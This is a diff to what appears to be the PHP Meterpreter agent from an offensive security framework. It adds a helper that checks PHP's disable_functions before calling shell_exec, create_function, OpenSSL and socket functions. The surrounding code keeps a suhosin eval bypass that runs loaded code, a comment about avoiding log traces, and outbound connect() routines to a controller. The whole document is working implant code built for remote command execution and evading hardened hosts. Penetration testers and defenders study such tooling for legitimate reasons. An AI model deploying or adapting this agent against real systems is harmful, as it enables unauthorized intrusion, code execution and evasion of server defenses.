@@ -261,8 +261,36 @@ define('COMMAND_ID_CORE_TRANSPORT_SET_TIMEOUTS', 32);
 define('COMMAND_ID_CORE_TRANSPORT_SLEEP', 33);
 # ---------------------------------------------------------------
 
+$GLOBALS['disabled_functions_array'] = array();
+function can_call_function($function){
+  global $disabled_functions_array;
+  if (empty($disabled_functions_array)) {
+    $disabled_functions = @ini_get('disable_functions');
+    if($disabled_functions != ""){
+      $disabled_functions = preg_replace('/[, ]+/', ',', $disabled_functions);
+      $disabled_functions_array = array_map('trim', explode(',', $disabled_functions));
+    }
+  }
+  if (in_array($function, $disabled_functions_array)) {
+        my_print("Can't call $function, as it's disabled.");
+    return FALSE;
+  }
+  if (!function_exists($function)) {
+        my_print("Can't call $function, as it doesn't exist.");
+    return FALSE;
+  }
+  if (!is_callable($function)) {
+        my_print("Can't call $function, as it's not callable.");
+    return FALSE;
+  }
+  return TRUE;
+}
+
 function my_cmd($cmd) {
-  return shell_exec($cmd);
+  if (can_call_function('shell_exec')) {
+    return shell_exec($cmd);
+  }
+  return '';
 }
 
 function is_windows() {
@@ -523,7 +551,7 @@ if (!function_exists('core_loadlib')) {
     # (for example, suhosin), so we walk around by using `create_function` instead,
     # but since this funcis deprecated since php 7.2+, we're not using it
     # when we can avoid it, since it might leave some traces in the log files.
-    if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) {
+    if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval') && can_call_function('create_function')) {
       $suhosin_bypass=create_function('', $data_tlv['value']);
       $suhosin_bypass();
     } else {
@@ -602,7 +630,7 @@ if (!function_exists('core_negotiate_tlv_encryption')) {
       packet_add_tlv($pkt, create_tlv(TLV_TYPE_SYM_KEY_TYPE, ENC_AES256));
       $GLOBALS['AES_ENABLED'] = false;
       $GLOBALS['AES_KEY'] = rand_bytes(32);
-      if (function_exists('openssl_pkey_get_public') && function_exists('openssl_public_encrypt')) {
+      if (can_call_function('openssl_pkey_get_public') && can_call_function('openssl_public_encrypt')) {
         my_print("Encryption via public key is supported");
         $pub_key_tlv = packet_get_tlv($req, TLV_TYPE_RSA_PUB_KEY);
         if ($pub_key_tlv != null) {
@@ -646,11 +674,13 @@ if (!function_exists('core_machine_id')) {
   register_command('core_machine_id', COMMAND_ID_CORE_MACHINE_ID);
   function core_machine_id($req, &$pkt) {
     my_print("doing core_machine_id");
-    if (is_callable('gethostname')) {
+    if (can_call_function('gethostname')) {
       # introduced in 5.3
       $machine_id = gethostname();
-    } else {
+    } elseif(can_call_function('php_uname')) {
       $machine_id = php_uname('n');
+    } else {
+      $machine_id = getenv('HOSTNAME');
     }
     $serial = "";
 
@@ -795,10 +825,17 @@ function channel_read($chan_id, $len) {
 }
 
 function rand_xor_byte() {
+  if (can_call_function('random_int')) {
+    return chr(random_int(1, 255));
+  }
   return chr(mt_rand(1, 255));
 }
 
 function rand_bytes($size) {
+  if (can_call_function('random_bytes')) {
+    return random_bytes($size);
+  }
+
   $b = '';
   for ($i = 0; $i < $size; $i++) {
     $b .= rand_xor_byte();
@@ -837,7 +874,7 @@ function generate_req_id() {
 }
 
 function supports_aes() {
-  return function_exists('openssl_decrypt') && function_exists('openssl_encrypt');
+  return can_call_function('openssl_decrypt') && can_call_function('openssl_encrypt');
 }
 
 function decrypt_packet($raw) {
@@ -1115,7 +1152,7 @@ function connect($ipaddr, $port, $proto='tcp') {
 
   # Prefer the stream versions so we don't have to use both select functions
   # unnecessarily, but fall back to socket_create if they aren't available.
-  if (is_callable('stream_socket_client')) {
+  if (can_call_function('stream_socket_client')) {
     my_print("stream_socket_client({$proto}://{$ipaddr}:{$port})");
     if ($proto == 'ssl') {
       $sock = stream_socket_client("ssl://{$ipaddr}:{$port}",
@@ -1133,7 +1170,7 @@ function connect($ipaddr, $port, $proto='tcp') {
       register_stream($sock, $ipaddr, $port);
     }
   } else
-    if (is_callable('fsockopen')) {
+    if (can_call_function('fsockopen')) {
       my_print("fsockopen");
       if ($proto == 'ssl') {
         $sock = fsockopen("ssl://{$ipaddr}:{$port}");
@@ -1142,7 +1179,7 @@ function connect($ipaddr, $port, $proto='tcp') {
       } elseif ($proto == 'tcp') {
         $sock = fsockopen($ipaddr, $port);
         if (!$sock) { return false; }
-        if (is_callable('socket_set_timeout')) {
+        if (can_call_function('socket_set_timeout')) {
           socket_set_timeout($sock, 2);
         }
         register_stream($sock);
@@ -1152,7 +1189,7 @@ function connect($ipaddr, $port, $proto='tcp') {
         register_stream($sock, $ipaddr, $port);
       }
     } else
-      if (is_callable('socket_create')) {
+      if (can_call_function('socket_create')) {
         my_print("socket_create");
         if ($proto == 'tcp') {
           $sock = socket_create($ipf, SOCK_STREAM, SOL_TCP);
